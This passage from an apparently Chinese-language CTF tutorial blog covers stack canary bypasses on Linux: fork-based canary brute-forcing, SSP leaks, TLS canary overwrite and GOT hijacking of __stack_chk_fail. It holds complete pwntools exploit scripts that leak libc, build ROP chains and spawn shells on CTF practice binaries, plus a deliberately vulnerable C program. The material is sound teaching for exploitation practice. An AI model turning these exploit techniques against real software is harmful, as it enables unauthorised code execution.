class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vul</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> <span class="built_in">buffer</span>[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">read</span>(STDIN_FILENO, <span class="built_in">buffer</span>, <span class="number">120</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"fork error"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"welcome"</span>);</span><br><span class="line">vul();</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"recv sucess"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">wait(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bin'</span>)</span><br><span class="line">elf = ELF(<span class="string">"./bin"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'welcome\n'</span>)</span><br><span class="line">canary = <span class="string">'\x00'</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x100</span>):</span><br><span class="line">        p.send(<span class="string">'a'</span>*<span class="number">100</span> + canary + chr(i))</span><br><span class="line">        a = p.recvuntil(<span class="string">'welcome\n'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'recv'</span> <span class="keyword">in</span> a:</span><br><span class="line">            canary += chr(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">100</span> + canary + <span class="string">'a'</span>*<span class="number">12</span> + p32(<span class="number">0x80485FB</span>))</span><br><span class="line">p.sendline(<span class="string">"cat flag"</span>)</span><br><span class="line">flag = p.recv()</span><br><span class="line">p.close()</span><br><span class="line">log.success(<span class="string">'flag is:'</span> + flag)</span><br></pre></td></tr></table></figure><h2 id="3-3-SSP-Stack-Smashing-Protect-Leak"><a href="#3-3-SSP-Stack-Smashing-Protect-Leak" class="headerlink" title="3.3 SSP(Stack Smashing Protect) Leak"></a>3.3 SSP(Stack Smashing Protect) Leak</h2><p><strong>SSP leak 就是通过故意触发canary的保护来输出我们想要地址上的值。</strong></p><p>触发canary时会去执行_stack_chk_fail函数，执行这个函数时，会在屏幕上打印<code>stack smashing detected</code></p><p>看一下源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// debug/stack_chk_fail.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **__libc_argv attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用函数 <code>__fortify_fail()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// debug/fortify_fail.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **__libc_argv attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn)) internal_function</span><br><span class="line">__fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure><p><code>__fortify_fail()</code> 调用函数 <code>__libc_message()</code> 打印出错误信息和 <code>argv[0]</code>。</p><p>此处，第一个%s的参数是msg，第二个参数需要判断，如果msg!=NULL，就打印__libc_argv[0]，否则打印”<unknown>”，而argv[0]存储的就是程序名，且这个参数存于栈上，我们只要修改栈上的argv[0]指针为flag的地址，就可以打印出flag</unknown></p><p><strong>但这种方法在libc2.26中已经修复</strong>（网上我找的是2.26修复，但有一篇文章是2.25，存疑）</p><p>最后我们来看一下 libc-2.25 里的 <code>__stack_chk_fail</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **__libc_argv attribute_hidden;</span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail_abort (<span class="literal">false</span>, <span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line">strong_alias (__stack_chk_fail, __stack_chk_fail_local)</span><br></pre></td></tr></table></figure><p>它使用了新函数 <code>__fortify_fail_abort()</code>，这个函数是在 <a href="https://sourceware.org/git/?p=glibc.git;a=commit;h=ed421fca42fd9b4cab7c66e77894b8dd7ca57ed0" target="_blank" rel="noopener">BZ #12189</a> 这次提交中新增的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span> **__libc_argv attribute_hidden;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail_abort (<span class="built_in">_Bool</span> need_backtrace, <span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  Don't pass down</span></span><br><span class="line"><span class="comment">     __libc_argv[0] if we aren't doing backtrace since __libc_argv[0]</span></span><br><span class="line"><span class="comment">     may point to the corrupted stack.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort,</span><br><span class="line">                    <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg,</span><br><span class="line">                    (need_backtrace &amp;&amp; __libc_argv[<span class="number">0</span>] != <span class="literal">NULL</span></span><br><span class="line">                     ? __libc_argv[<span class="number">0</span>] : <span class="string">"&lt;unknown&gt;"</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail_abort (<span class="literal">true</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br><span class="line">libc_hidden_def (__fortify_fail_abort)</span><br></pre></td></tr></table></figure><p>函数 <code>__fortify_fail_abort()</code> 在第一个参数为 <code>false</code> 时不再进行栈回溯，直接以打印出字符串 <code>&lt;unknown&gt;</code> 结束，也就没有办法输出 <code>argv[0]</code> 了。</p><h3 id="wdb2018-guess"><a href="#wdb2018-guess" class="headerlink" title="wdb2018_guess"></a>wdb2018_guess</h3><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221200044056.png" alt="image-20210221200044056"></p><p>大概意思就是栈上读取flag.txt，然后让我们猜flag，但这里有fork就很可疑</p><p>来复习一下fork</p><blockquote><p>Unix/Linux操作系统提供了一个<code>fork()</code>系统调用，它非常特殊。普通的函数调用，调用一次，返回一次，<strong>但是<code>fork()</code>调用一次，返回两次，因为操作系统自动把当前进程（称为父进程）复制了一份（称为子进程），然后，分别在父进程和子进程内返回。</strong></p><p>子进程永远返回<code>0</code>，而父进程返回子进程的ID。这样做的理由是，一个父进程可以fork出很多子进程，所以，父进程要记下每个子进程的ID，而子进程只需要调用<code>getppid()</code>就可以拿到父进程的ID。</p></blockquote><p><strong>先说一下思路，我们此时知道flag是在栈上的，无非就是泄露栈上的flag，但具体怎么做呢？</strong></p><p><strong>要想泄露栈上的地址，我们这里需要用到<code>__environ</code></strong></p><blockquote><p>在 Linux 系统中，glibc 的环境指针 environ(environment pointer) 为程序运行时所需要的环境变量表的起始地址，环境表中的指针指向各环境变量字符串。环境指针 environ 在栈空间的高地址处。因此，<strong>可通过 environ 指针泄露栈地址</strong></p><p>1、得到libc地址后，libc基址+_environ的偏移量=_environ的地址 在内存布局中，他们同属于一个段，开启ASLR之后相对位置不变，偏移量和libc库有关  </p><p>2、通过_environ的地址得到_environ的值，从而得到环境变量地址，环境变量保存在栈中，所以通过栈内的偏移量，可以访问栈中任意变量</p></blockquote><ol><li>通过argv[0]泄露got，从而得到基址</li><li>泄露environ</li><li>泄露flag</li></ol><p>首先我们要知道get的变量和argv[0]的offset</p><p>可以看到是296</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p &amp; __libc_argv[0]</span><br></pre></td></tr></table></figure><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221223741272.png" alt="image-20210221223741272"></p><p>接下来我们还需要知道environ和flag的offset,是360</p><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221224236237.png" alt="image-20210221224236237"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27910</span>)</span><br><span class="line">elf = ELF(<span class="string">"./GUESS"</span>)</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">296</span> + p64(puts_got)</span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">"*** stack smashing detected ***: "</span>)</span><br><span class="line">puts = uu64(r(<span class="number">6</span>))</span><br><span class="line">leak(<span class="string">"puts"</span>,puts)</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>,puts)</span><br><span class="line">libc_base = puts - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">environ = libc_base + libc.dump(<span class="string">'_environ'</span>)</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">296</span> + p64(environ)</span><br><span class="line">sl(payload)</span><br><span class="line">ru(<span class="string">"*** stack smashing detected ***: "</span>)</span><br><span class="line">environ = uu64(r(<span class="number">6</span>))</span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">296</span> + p64(environ<span class="number">-360</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="3-4-覆盖-TLS-中储存的-Canary-值"><a href="#3-4-覆盖-TLS-中储存的-Canary-值" class="headerlink" title="3.4 覆盖 TLS 中储存的 Canary 值"></a>3.4 覆盖 TLS 中储存的 Canary 值</h2><p>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p><blockquote><p>线程局部存储（Thread Local Storage）是一种机制，通过该机制分配变量，以便每一个现存的线程都有一个变量实例。<br>它主要是为了避免多个线程同时访存同一全局变量或者静态变量时所导致的冲突，尤其是多个线程同时需要修改这一变量时。为了解决这个问题，我们可以通过TLS机制，为每一个使用该全局变量的线程都提供一个变量值的副本，每一个线程均可以独立地改变自己的副本，而不会和其它线程的副本冲突。从线程的角度看，就好像每一个线程都完全拥有该变量。而从全局变量的角度上来看，就好像一个全局变量被克隆成了多份副本，而每一份副本都可以被一个线程独立地改变。</p><p>glibc在TLS实现上存在问题，线程在pthread_create的帮助下创建，然后需要给这个新线程选择TLS。<br>在为栈分配内存后，glibc在内存的高地址初始化TLS，在x86-64架构上，栈向下增长，将TLS放在栈顶部。<br>从TLS中减去一个特定的常量值，我们得到被新线程的stack register所使用的值。<br>从TLS到pthread_create的函数参数传递栈帧的距离小于一页。<br>现在攻击者将不需要得到leak canary的值，而是直接栈溢出足够多的数据来复写TLS中的tcbhead_t.stack_guard的值，从而bypass canary。</p></blockquote><h3 id="CTF2018-babystack"><a href="#CTF2018-babystack" class="headerlink" title="*CTF2018 babystack"></a>*CTF2018 babystack</h3><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210222142851478.png" alt="image-20210222142851478"></p><p>说一下主要逻辑，创建一个新的线程，首先是读入size，然后进行读内容</p><p>简单看一下这里有栈溢出</p><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210222142625810.png" alt="image-20210222142625810"></p><p>接下来我们就可以利用上面的结论</p><ol><li>栈溢出覆盖返回地址，泄露libc基址</li><li>栈迁移到bss段</li><li>ROP</li></ol><p>先看一下canary</p><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210222150721776.png" alt="image-20210222150721776"></p><p>看exp把</p><blockquote><p>不懂为什么/bin/sh本地可以，远程打不通，onegadget可以</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"><span class="comment">#context.arch = elf.arch</span></span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">26593</span>)</span><br><span class="line"><span class="comment">#p = process('./bs')</span></span><br><span class="line">elf = ELF(<span class="string">"./bs"</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.271.so'</span>)</span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400c03</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400c01</span></span><br><span class="line">read_plt = elf.sym[<span class="string">'read'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">put_plt = elf.sym[<span class="string">'puts'</span>]</span><br><span class="line">buf = <span class="number">0x602f00</span></span><br><span class="line">leave_ret = <span class="number">0x400955</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">b'A'</span>*<span class="number">0x1010</span> + p64(buf)+ p64(pop_rdi) + p64(puts_got) + p64(put_plt) + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi_r15) + p64(buf+<span class="number">0x8</span>) + p64(<span class="number">0</span>) + p64(read_plt) + p64(leave_ret)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">"How many bytes do you want to send?\n"</span>)</span><br><span class="line">sl(str(<span class="number">0x2000</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>,<span class="string">'A'</span>)</span><br><span class="line">s(payload)</span><br><span class="line">puts = uu64(ru(<span class="string">'\x7f'</span>,<span class="literal">False</span>)[<span class="number">-6</span>:])</span><br><span class="line">leak(<span class="string">"puts"</span>,puts)</span><br><span class="line">libc_base = puts - libc.sym[<span class="string">"puts"</span>]</span><br><span class="line">leak(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line"><span class="comment"># sys = libc_base + libc.sym["system"]</span></span><br><span class="line"><span class="comment"># bin_sh = libc_base + (libc.search("/bin/sh")).next()</span></span><br><span class="line"><span class="comment"># libc = LibcSearcher('puts',puts)</span></span><br><span class="line"><span class="comment"># libc_base = puts - libc.dump('puts')</span></span><br><span class="line"><span class="comment"># leak("libc_base",libc_base)</span></span><br><span class="line"><span class="comment"># sys = libc_base + libc.dump('system')</span></span><br><span class="line"><span class="comment"># bin_sh = libc_base + libc.dump('str_bin_sh')</span></span><br><span class="line"><span class="comment">#payload = p64(pop_rdi) + p64(bin_sh) + p64(sys)</span></span><br><span class="line">payload = p64(libc_base+<span class="number">0x4f322</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h2 id="3-5-劫持-stack-chk-fail函数"><a href="#3-5-劫持-stack-chk-fail函数" class="headerlink" title="3.5 劫持__stack_chk_fail函数"></a>3.5 劫持__stack_chk_fail函数</h2><p>改写__stack_chk_fail@got，但前提是必须有一个可以向任意地址写的漏洞，例如说格式化字符串漏洞<br>这个方法适用于只能输入一次的程序，如果说可以利用多次的话就可以直接泄露canary了</p><h3 id="BJDCTF-2nd-r2t4"><a href="#BJDCTF-2nd-r2t4" class="headerlink" title="[BJDCTF 2nd]r2t4"></a>[BJDCTF 2nd]r2t4</h3><p><img src="/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210222203954917.png" alt="image-20210222203954917"></p><p>基本思路</p><ol><li>劫持got表去backdoor</li></ol><blockquote><p>pwntools自动生成fmt是要看64位还是32位</p><p>所以需要改架构</p></blockquote><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"><span class="comment">#context.os='linux'</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">"./r2t4"</span>)</span><br><span class="line">context.arch = elf.arch</span><br><span class="line"><span class="comment">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(str(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">25608</span>)</span><br><span class="line"><span class="comment">#p = process('./r2t4')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__stack_chk_fail = elf.got[<span class="string">'__stack_chk_fail'</span>]</span><br><span class="line">backdoor = elf.sym[<span class="string">'backdoor'</span>]</span><br><span class="line">print(hex(backdoor))</span><br><span class="line"><span class="comment">#payload = b"%64c%9$hn%1510c%10$hnAAA" + p64(__stack_chk_fail+2) + p64(__stack_chk_fail)</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>,&#123;__stack_chk_fail:backdoor&#125;)</span><br><span class="line">print(payload)</span><br><span class="line">payload = payload.ljust(<span class="number">0x38</span>,<span class="string">'A'</span>)</span><br><span class="line">s(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
